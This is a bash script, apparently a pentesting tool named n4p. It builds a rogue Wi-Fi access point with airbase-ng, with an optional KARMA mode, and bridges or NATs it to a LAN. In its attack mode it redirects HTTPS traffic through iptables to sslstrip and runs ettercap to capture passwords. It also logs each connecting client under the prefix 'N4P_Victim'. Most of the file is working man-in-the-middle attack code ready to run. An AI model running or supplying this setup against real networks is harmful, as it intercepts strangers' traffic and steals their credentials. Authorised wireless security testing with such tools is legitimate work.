#!/bin/bash

##############################################
# Do all prerun variables and safty measures #
# before anything else starts happening      #
##############################################

if [[ $(id -u) != 0 ]]; then # Verify we are root if not exit
	echo "$WARN Please Run This Script As Root or With Sudo!" 1>&2
   exit 1
fi

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"

while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
	DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
	SOURCE="$(readlink "$SOURCE")"
	[[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done

DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"

# yeah this is that help menu
if [[ -n $1 ]]; then
	if [[ $1 == '-h' || $1 == '--help' ]]; then
		echo -e "Useage: n4p [mode] [option] [option]
		where: mode
			-f 				fast setup
			--fast			fast setup
		Where: option 1
			-b 				Bridged mode
			--bridge 		Bridged mode
			-d 				DHCPD enabled
			--dhcpd 		DHCPD enabled
		Where: option 2
			-s 				Use SSL Strip
			--sslstrip 		Use SSL Strip"
		exit 0
	# If any fast options were used predefine there variables now
	elif [[ $1 == '-f' || $1 == '--fast' ]]; then
		FAST="True"
		FAST_AIRBASE="True"

		if [[ $2 == '-b' || $2 == '--bridge' ]]; then
			BRIDGED="True"
		elif [[ $2 == '-d' || $2 == '--dhcpd' ]]; then
			BRIDGED="False"
		else
			echo "Invalid option see --help"
			exit 0
		fi
		
		if [[ $3 == '-s' || $3 == '--sslstrip' ]]; then
			FAST_SSLSTRIP="True"
		elif [[ -n $3 ]]; then
			echo "Invalid option see --help"
			exit 0
		fi
	else
		echo "Invalid option see --help"
		exit 0
	fi
fi

#######################################
# Building a sane working environment #
#######################################
depends()
{
	IPT="/sbin/iptables"
	LAN2="eth1"
	LAN="eth0"
	WLAN="wlan0"
	AP="at0"
	MON="wlan0mon"
	VPN="tun0"
	VPNI="tap+"
	AP_GATEWAY="10.0.0.254"
	AP_SUBNET="255.255.255.0"
	AP_IP="10.0.0.0"
	AP_BROADCAST="10.0.0.255"
	# Text color variables
	TXT_UND=$(tput sgr 0 1)          # Underline
	TXT_BLD=$(tput bold)             # Bold
	BLD_RED=${txtbld}$(tput setaf 1) # red
	BLD_YEL=${txtbld}$(tput setaf 2) # Yellow
	BLD_ORA=${txtbld}$(tput setaf 3) # orange
	BLD_BLU=${txtbld}$(tput setaf 4) # blue
	BLD_PUR=${txtbld}$(tput setaf 5) # purple
	BLD_TEA=${txtbld}$(tput setaf 6) # teal
	BLD_WHT=${txtbld}$(tput setaf 7) # white
	TXT_RST=$(tput sgr0)             # Reset
	INFO=${BLD_WHT}*${TXT_RST}       # Feedback
	QUES=${BLD_BLU}?${TXT_RST}		 # Questions
	PASS="${BLD_TEA}[${TXT_RSR}${BLD_WHT} OK ${TXT_RST}${BLD_TEA}]${TXT_RST}"
	WARN="${BLD_TEA}[${TXT_RST}${BLD_PUR} * ${TXT_RST}${BLD_TEA}]${TXT_RST}"
	# Start text with $BLD_YEL variable and end the text with $TXT_RST
}

banner()
{ 
	echo "${BLD_TEA}$(cat $DIR/auth)${TXT_RST}"; sleep 1
}

setupenv()
{
	# Checked for orphaned processes then sanitize them
	if [[ -n $(ps -A | grep -i airbase) ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; killall airbase-ng; fi
	
	if [[ -n $(ip addr | grep -i "$MON") ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; airmon-zc stop $MON; fi

	if [[ -e /etc/init.d/net.$AP ]]; then
		get_RCstatus "$AP"
		if [[ $STATUS == 'started' ]]; then
			echo "$WARN Leftover scoobie snacks found! nom nom"
			/etc/init.d/net.$AP stop
		fi
	fi
	
	sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
	if [ ! -d "$sessionfolder" ]; then mkdir "$sessionfolder"; fi
		mkdir -p "$sessionfolder" "$sessionfolder/logs"
	if [[ -n $(rfkill list | grep yes) ]]; then # If you think of a better way to do this then let me know
  		rfkill unblock 0
	fi
}

# Use error checking for exacution of external commands and report
step() {
    echo -n "$@"
}

action() {
	STEP_OK=0
	"$@"

    # Check if command failed and update $STEP_OK if so.
    local EXIT_CODE=$?

    if [[ $EXIT_CODE != 0 ]]; then
        STEP_OK=$EXIT_CODE
    fi

    return $EXIT_CODE
}

next() {
    [[ $STEP_OK == 0 ]] && echo "$PASS   $1" || echo "$WARN  $1"
    return $STEP_OK
}

get_state() # Retrieve the state of interfaces
{
	STATE=$(ip addr list | grep -i $1 | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2)
}

get_inet() # Retrieve the ip of the interface
{
	INET=$(ip addr list | grep -i $1 | grep -i inet | awk '{print $2}')
}

get_RCstatus() # What is the status from OpenRC of the service
{
	STATUS=$(/etc/init.d/net.$1 status | sed 's/* status: //g' | cut -d ' ' -f 2)
}

settings()
{
	if [[ -z $FAST ]]; then
		echo -e "${BLD_WHT}
		+==============================================+
		|           Listing Network Devices            |
		+==============================================+${TXT_RST}"
		ip addr
		echo "${BLD_ORA}***************************************************************************************${TXT_RST}"
		echo "$INFO Press Enter for defaults"
		read -p "$QUES What is your Internet or default interface? [eth0]: " LAN
		if [[ -z $LAN ]]; then LAN="eth0"; fi

		read -p "$QUES What is your default Wireless interface? [wlan0]: " WLAN
		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi

		read -p "$QUES AP configuration Press enter for defaults or 1 for custom AP attributes: " ATTRIBUTES
		if [[ $ATTRIBUTES != 1 ]]; then
			ESSID="Pentoo"
			CHAN="1"
			BEACON="100"
			PPS="100"
		else
			read -p "$QUES What SSID Do You Want To Use [Pentoo]: " ESSID
			if [[ -z $ESSID ]]; then ESSID="Pentoo"; fi
			
			read -p "$QUES What CHANNEL Do You Want To Use [1]: " CHAN
			if [[ -z $CHAN ]]; then CHAN="1"; fi
			
			read -p "$QUES Beacon Intervals [100]: " BEACON
			if [[ -z $BEACON ]]; then 
				BEACON="100"
			elif (( ($BEACON < 10) )); then 
				BEACON="100"
			fi
			
			read -p "$QUES Packets Per Second [100]: " PPS
			if [[ -z $PPS ]]; then PPS="100"; fi
			
			if (( ($PPS < 100) )); then PPS="100"; fi
		fi
	else
		if [[ -z $LAN ]]; then LAN="eth0"; fi
		
		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi

		if [[ -e /etc/init.d/net.$WLAN ]]; then
			get_RCstatus "$WLAN"
			if [[ $STATUS == 'started' ]]; then
				/etc/init.d/net.$WLAN stop
			fi
		fi
		get_state $WLAN
		[[ $STATE != 'DOWN' ]] && ip link set $WLAN down
		iwconfig $WLAN mode managed #Force managed mode upon wlan because there is a glitch that can block airmon from bringing the interface up if not previously done
		ESSID="Pentoo"
		CHAN="1"
		BEACON="100"
		PPS="100"
	fi
}

keepalive()
{
	read -e -p "$WARN Press ctrl+c when you are ready to go down!" ALLINTHEFAMILY # Protect this script from going down hastily
	if [[ $ALLINTHEFAMILY != 'SGFjayBUaGUgUGxhbmV0IQ==' ]]; then clear; keepalive; fi
}

killemAll()
{
	echo -e "\n\n$WARN The script has died. Major network configurations have been modified.\nWe must go down cleanly or your system will be left in a broken state!"
	pkill airbase-ng
	airmon-zc stop $MON

	if [[ $BRIDGED == 'True' ]]; then
		get_RCstatus $BRIDGE
		if [[ $STATUS == 'started' ]]; then
			/etc/init.d/net.$BRIDGE stop
		fi
		get_state "$BRDIGE"
		if [[ $STATE != 'DOWN' ]]; then
			ip link set $BRDIGE down
		fi
		brctl delif "$BRIDGE $RESP_BR_1"
		brctl delif "$BRIDGE $RESP_BR_2"
		brctl delbr "$BRIDGE"
		brctl show
	fi
	rebuild_network
	fw_down
	echo "$INFO The environment is now sanitized cya"
	exit 0
}

rebuild_network()
{
	echo "$INFO It's now time to bring your default network interface back up"
	echo -e "${BLD_WHT}
	+==================================+
	| 1) Use eth0                      |
	| 2) Use wlan0                     |
	+==================================+${TXT_RST}"
	read -p "$QUES Option: " MENU_REBUILD_NETWORK
	if [[ $MENU_REBUILD_NETWORK == 1 ]]; then
		local DEVICE=$LAN 
	elif [[ $MENU_REBUILD_NETWORK == 2 ]]; then
		local DEVICE=$WLAN	
	else 
		echo "$WARN Invalid option"
		rebuild_network
	fi
	get_RCstatus "$DEVICE"
	if [[ $STATUS != 'started' ]]; then
		get_state "$DEVICE"
		if [[ $STATE == 'DOWN' ]]; then
			ip link set $DEVICE up
		fi
		/etc/init.d/net.$DEVICE start
	fi
	return 0
}
trap killemAll INT HUP;

##################################################################
###############Setup for Airbase-ng and airmon-zc#################
##################################################################
startairbase()
{
	get_state "$WLAN"
	while [[ $STATE != 'DOWN' ]]; do 
		ip link set "$WLAN" down
	done

	step "$INFO Airmon-zc comming up"
	action airmon-zc check kill
	action airmon-zc start $WLAN
	next

	if [[ $MENUCHOICE == 2 ]]; then
		step "$INFO STARTING SERVICE: AIRBASE-NG" #-Z -a -0
		action airbase-ng -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
		sleep 1.5 ## future put this and the next line in a more comprehensive loop
		#action cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
		next
	elif [[ $MENUCHOICE == 1 ]]; then # used elif instead of just else for more comprehensive structure so users may modify easier.
		step "$INFO STARTING SERVICE: KARMA AIRBASE-NG"
		action airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v > $sessionfolder/logs/airbase-ng.log &
		sleep 1.5
		next
	fi

	echo "" # \n doesn't work through our action function so we need another echo to give a line break
	step "$INFO Assigning IP and Route to $AP"
	echo ""
	get_state "$AP"
	while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $AP) ]]; do #check AP state if down go up, if AP has not loaded yet wait a bit
		sleep 0.3
		action ip link set $AP up
		get_state "$AP"
	done
	# setting ip and route doesn't always take, to ensure it sticks and check no other routes or ip's are getting assigned not by us then remove them if so.
	local CHK_IP=$(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F brd '{print $1}' | cut -d ' ' -f 2)
	if [[ -n $CHK_IP && $CHK_IP != "$AP_GATEWAY"/32 ]]; then
		action ip addr del $CHK_IP dev $AP
	fi

	local CHK_IP=$(ip route | grep $AP | awk -Fvia '{print $1}')
	if [[ -n $CHK_IP && $CHK_IP != "$AP_IP"/24  ]]; then
		action ip route flush $CHK_IP
	fi

	while [[ -z $(ip addr | grep $AP | grep -i inet | awk -Finet '{print $2}' | awk -F/ '{print $1}') ]]; do
		sleep 0.3
		action ip addr add $AP_GATEWAY broadcast $AP_BROADCAST dev $AP
	done

	while [[ -z $(route -n | grep $AP | grep $AP_GATEWAY ) ]]; do
		sleep 0.3
		action route add -net $AP_IP netmask $AP_SUBNET gw $AP_GATEWAY
	done
	action route -n
	next
	AIRBASE="On"
	xterm -hold -bg black -fg blue -T "Airbase logs" -geometry 90x20 -e tail -f "$sessionfolder/logs/airbase-ng.log" &>/dev/null &
}
#################################################################
#################Verify our DHCP and bridge needs################
#################################################################
openrc_bridge()
{
	# OpenRC needs sym links to bring the interface up. Verify they exist as needed if not make them then set proper state
	if [[ -e /etc/init.d/net.$BRIDGE ]]; then
		get_RCstatus "$BRIDGE"
		if [[ $STATUS == 'started' ]]; then
			/etc/init.d/net.$BRIDGE stop; sleep 1; ip link set $BRIDGE down
		fi
	else
		ln -s /etc/init.d/net.lo /etc/init.d/net.$BRIDGE
	fi

	if [[ -e /etc/init.d/net.$RESP_BR_1 ]]; then
		get_RCstatus "$RESP_BR_1"
		if [[ $STATUS == 'started' ]]; then
			/etc/init.d/net.$RESP_BR_1 stop; sleep 1; ip link set $RESP_BR_1 down
		fi
	fi

	if [[ -e /etc/init.d/net.$RESP_BR_2 ]]; then
		get_RCstatus "$RESP_BR_2"
		if [[ $STATUS == 'started' ]]; then 
			/etc/init.d/net.$RESP_BR_2 stop; sleep 1; ip link set $RESP_BR_2 down
		fi
	fi

	# This insures $RESP_BR_1 & RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
	get_inet "$RESP_BR_1"
	if [[ -n $INET ]]; then
		ip addr del $CHK_IP dev $RESP_BR_1
	fi

	get_inet "$RESP_BR_2"
	if [[ -n $INET ]]; then
		ip addr del $CHK_IP dev $RESP_BR_2
	fi

	echo ""
	step "Building $BRIDGE now with $BRIDGE $RESP_BR_2 $BRIDGE_RESP_BR_1"
	#action iw dev $RESP_BR_2 set 4addr on "Un comment if you are going to use hostapd"
	get_state "$RESP_BR_2"
	while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $RESP_BR_2) ]]; do 
		sleep 0.2
		action ip link set $RESP_BR_2 up
		get_state "$RESP_BR_2"
	done

	get_state "$RESP_BR_1"
	while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $RESP_BR_1) ]]; do 
		sleep 0.2
		action ip link set $RESP_BR_1 up
		get_state "$RESP_BR_1"
	done
	sleep 2
	action brctl addbr $BRIDGE
	sleep 0.3
	action brctl addif $BRIDGE $RESP_BR_1
	sleep 0.3
	action brctl addif $BRIDGE $RESP_BR_2
	sleep 0.3
	action ip link set $BRIDGE up
	next
}

fbridge()
{
	if [[ -z $FAST ]]; then
		if [[ -z $BRIDGED ]]; then
			read -p "$QUES Would you like me to bridge this AP? If no thats ok we can use ip_forward in iptables (y/n) " RESP_BR
			if [[ $RESP_BR == [yY] ]]; then
				read -p "$QUES Create the arbitrary name of your bridge, e.g. br0: " BRIDGE
				if [[ -z $BRIDGE ]]; then BRIDGE=br0; fi

				echo -e "$INFO We need to setup the interfaces you are going to use with $BRIDGE \n e.g. $LAN and $AP, here are your possible choices"
				echo "${BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"
				ip addr
				echo "{BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"

				read -p "$QUES Please tell me the first interface to use: " RESP_BR_1
				if [[ -z $RESP_BR_1 ]]; then RESP_BR_1=$LAN; fi
				
				read -p "$QUES Please tell me the second interface to use: " RESP_BR_2
				if [[ -z $RESP_BR_2 ]]; then # Run default check to verify what our default interface should be encase the user forgot to set this properly.
					if [[ $AIRBASE == 'On' ]]; then
						RESP_BR_2=$AP
					#else # Enable this option for Hostapd
					#	RESP_BR_2=$WLAN 
					fi
				fi
				BRIDGED="True"
				openrc_bridge
			elif [[ $RESP_BR == [nN] ]]; then
				BRIDGED="False"
			else	
				echo "$WARN Invalid option"; fbridge
			fi
		fi
	elif [[ $BRIDGED == 'True' ]]; then # If we are here then $FAST -f was enabled with -b
		BRIDGE=br0
		RESP_BR_1=$LAN
		if [[ -n $FAST_AIRBASE ]]; then
			RESP_BR_2=$AP
		#elif [[ -n $FAST_HOSTAPD ]]; then # Users may run hostapd instead on their own just by running it and changing the FAST variable on line 42 to $FAST_HOSTAPD
		#	RESP_BR_2=$WLAN
		fi
		openrc_bridge
	fi
}

dhcp()
{
	if [[ -n $(cat /etc/dhcp/dhcpd.conf | grep -i Pentesters_AP | awk '{print $2}') ]]; then
		if [[ $BRIDGED != 'True' ]]; then
			if [[ -e /etc/init.d/net.$AP ]]; then
				get_RCstatus "$AP"
				if [[ STATUS == 'started' ]]; then
					echo ""
					step "$INFO Restarting interface $AP up"
					action /etc/init.d/net.$AP restart
					next
				fi
			else
				echo ""
				step "$INFO Bringing interface $AP up"
				if [[ ! -e /etc/init.d/net.$AP ]]; then
					action ln -s /etc/init.d/net.lo /etc/init.d/net.$AP
				fi
				action /etc/init.d/net.$AP start
				next
			fi
		else
			echo ""
			step "$INFO Starting Bridge"
			action /etc/init.d/net.$BRIDGE start
			next
		fi
	else # We apparently don't have the proper configuration file. Make the changes and action again
		find * -wholename $DIR/dhcpd.conf -exec cat {} >> /etc/dhcp/dhcpd.conf \;
		dhcp
	fi
}
##################################################################
####################Launch External Services######################
##################################################################
mitm()
{
	echo ""
	step "$INFO Launching sslstrip"
	action sslstrip -p -k -f lock.ico -w $sessionfolder/logs/ssl.log &>/dev/null
	#action xterm -hold -e "tail -f /var/log/messages | grep -i N4P_Victim:"
	next
	echo ""
	step "$INFO Launching ettercap"
	action xterm -hold -e "ettercap -T -i $AP -w $sessionfolder/logs/recovered_passwords.pcap -L $sessionfolder/logs/all_traffic.log"
	next	
}
##################################################################
######################Build the firewall##########################
##################################################################
fw_pre_services()
{
	if [[ -z $FAST ]]; then
		read -p "Would you like to enable the configured server services such as ssh httpd? (y/n) " RESP
		if [[ $RESP == [yY] ]]; then
			fw_services
		elif [[ $RESP != [nN] ]]; then
			clear; echo "$WARN Bad input"; fw_pre_services
		fi

		read -p "Would you like to turn on OpenVPN now? (y/n) " RESP
		if [[ $RESP == [yY] ]]; then
			fw_vpn;	
		elif [[ $RESP != [nN] ]]; then
			clear; echo "$WARN Bad input"
			fw_pre_services
		fi
	fi
}

fw_redundant()
{
	## Flush rules
	step "$INFO Flushing old rules"
	echo ""
	action /etc/init.d/iptables stop
	$IPT -F
	$IPT -t nat -F
	$IPT --delete-chain
	$IPT -t nat --delete-chain
	$IPT -F FORWARD
	$IPT -t filter --flush FORWARD
	$IPT -t filter --flush INPUT
	next

	# Set default policies for all three default chains
	step "$INFO Setting default policies"
	action $IPT -P OUTPUT ACCEPT
	next

	step "$INFO We will allow ip forwarding"
	echo 1 > /proc/sys/net/ipv4/ip_forward
	action $IPT -P FORWARD ACCEPT
	next

	# Enable free use of loopback interfaces
	step "$INFO  Allowing loopback devices"
	action $IPT -A INPUT -i lo -j ACCEPT
	action $IPT -A OUTPUT -o lo -j ACCEPT
	next

	## permit local network
	step "$INFO  Permit local network"
	action $IPT -A INPUT -i $LAN -j ACCEPT
	action $IPT -A OUTPUT -o $LAN -j ACCEPT
	next

	## DHCP
	step "$INFO  Allowing DHCP server"
	action $IPT -A INPUT -t nat -p udp --sport 67 --dport 68 -j ACCEPT
	next

	## Allow Samba
	step "$INFO Configuring Samba"
	action $IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	action $IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	action $IPT -A OUTPUT -o $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	action $IPT -A OUTPUT -o $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	next
	fw_pre_services
}

fw_services()
{
	## Allow DNS Server
	step "$INFO Allowing dns on port 53"
	action $IPT -A INPUT -t nat -p udp -m udp --dport 53 -j ACCEPT
	next

	## SSH (allows SSH through firewall, from anywhere on the WAN)
	step "$INFO Allowing ssh on port 22"
	action $IPT -A INPUT -t nat -p tcp --dport 22 -j ACCEPT
	next

	## Web server
	step "$INFO Allowing http on port 80 and https on 443"
	action $IPT -A INPUT -t nat -p tcp -m multiport --dports 80,443 -j ACCEPT
	next
}

vpn_confirmed()
{
	#Allow TUN interface connections to OpenVPN server
	step "$INFO Allowing openVPN"
	action $IPT -A INPUT -i $VPN -j ACCEPT
	#allow TUN interface connections to be forwarded through other interfaces
	action $IPT -A FORWARD -i $VPN -j ACCEPT
	# Allow TAP interface connections to OpenVPN server
	action $IPT -A INPUT -i $VPNI -j ACCEPT
	# Allow TAP interface connections to be forwarded through other interfaces
	action $IPT -A FORWARD -i $VPNI -j ACCEPT
	next
	# I've been called into action
	step "$INFO OpenRC now bringing up OpenVPN"
	echo ""
	action /etc/init.d/openvpn start
	next
}

fw_vpn()
{
	echo "$INFO Please pay close attention to the following when considering turning on openvpn."
	echo "$INFO The gateway is still broken for dual nics while hosting services." # Do some work on custom gateway routing for this soon"
	echo "$INFO Be careful the VPN configuration could break your gateway for MiTM attacks and remote services."
	echo "$INFO This will be fixed in the future."
	echo " You're advised not to use the vpn during attacks and only operate during daily activity at this time"
	read -p "$INFO Do you still want to turn on OpenVPN now? (y/n) " RESP
	if [[ $RESP == [yY] ]]; then 
		vpn_confirmed
	elif [[ $RESP != [nN] ]]; then
		echo "$WARN Bad input"
		fw_vpn
	fi
}

fw_closure()
{
	## drop everything else arriving from WAN on local interfaces
	step "$INFO Drop everything else"
	action $IPT -A INPUT -i $LAN -j LOG
	action $IPT -A INPUT -i $LAN -j DROP
	next
	#
	# Save settings
	#
	step "$INFO Saving settings and bringing iptables back online"
	echo ""
	action /etc/init.d/iptables save
	echo ""
	action /etc/init.d/iptables start
	next

	## list the iptables rules as confirmation
	step "$INFO Listing the iptables rules as confirmation"
	echo ""
	action $IPT -L -v
	next
}
fw_ssl()
{
	if [[ -n $FAST_SSLSTRIP ]]; then
		echo ""
		step "$INFO Fast mode sslstrip"
		action $IPT -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
		#action $IPT -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
		mitm
		next
	else	
		read -p "$INFO Are we using sslstrip? (y/n) " SSLSTRIP
		if [[ $SSLSTRIP == [yY] ]]; then
			FAST_SSLSTRIP=Y; fw_ssl
		elif [[ $SSLSTRIP != [nN] ]]; then
			echo "$WARN Bad input"; fw_ssl
		fi
	fi
}
fw_up()
{ 
	fw_redundant

	if [[ $FAST != 'True' ]]; then
		echo "$INFO It's time for specialty hacking configurations"
		echo -e "These settings are not default as they may break daily activity.\nDaily rules will automagically be rebuilt when you're done hacking all the things"
		read -p "Are we launching attacks with this AP? y/n?" ATTACK
		if [[ $ATTACK == [yY] ]]; then
			fw_ssl
		elif [[ $ATTACK != [nN] ]]; then
			echo "$WARN Bad input"; fw_up
		fi
	fi	
	#Pass everything through tor 'uncomment the folllowing line if you want all outbound sent through tor'
	#iptables -A PREROUTING -i $LAN -p tcp -j DNAT --to-destination 127.0.0.1:9050

	#log all connection activity
	step "$INFO Set logging"
	$IPT -A INPUT -i $AP -p tcp -m state --state new -j LOG --log-prefix "N4P_Victim: "
	next

	if [[ $BRIDGED != 'True' ]]; then
		step "$INFO Allowing wirless for airbase, routing $AP through $LAN be sure airbase was configured for $AP and $LAN as the output otherwise adjust these settings"
		action $IPT -t nat -A POSTROUTING -o $LAN -j MASQUERADE
		action $IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
		action $IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
		#action $IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
		#action $IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
		next
	fi
	fw_closure
}

fw_down()
{ 
	fw_redundant
	echo "$INFO Defaults loaded for daily use."
	fw_closure
}
##################################################################
########################Start the menu############################
##################################################################
menu()
{
	if [[ -n $FAST ]]; then
		MENUCHOICE="2"
	else
		echo "${BLD_ORA}
		+===================================+
		| 1) Airbase-NG WITH KARMA          |
		| 2) Airbase-NG NO KARMA            |
		+===================================+${TXT_RST}"
		read -e -p "Option: " MENUCHOICE
	fi
	
	if (( ( $MENUCHOICE == 1 ) || ( $MENUCHOICE == 2 ) )); then
		startairbase; fbridge; fw_up; dhcp; keepalive
	else 
		clear; echo "$WARN Invalid option"; menu
	fi
}
go() 
{
	depends
	banner
	setupenv
	settings
	menu
}
go
